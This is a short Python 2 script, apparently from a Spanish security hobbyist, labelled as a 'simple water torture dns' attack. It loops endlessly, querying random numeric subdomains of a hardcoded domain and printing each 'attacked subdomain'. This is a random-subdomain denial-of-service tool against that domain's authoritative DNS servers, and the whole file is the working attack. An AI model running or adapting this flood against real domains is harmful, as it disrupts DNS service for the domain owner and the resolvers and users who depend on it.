#!/usr/bin/python
#Author : Antonio Taboada
#Date: 09/11/2016
#Filename: sub.py
#Purpose : simple water torture dns

import dns.resolver
import random
import sys
import socket

dominio = "hackingyseguridad.es"

while 1:
        subdominio = str(random.randrange(10000000))
        url = subdominio+"."+dominio 
        print "Subdominio atacado:", url
        answer = dns.resolver.query(url)
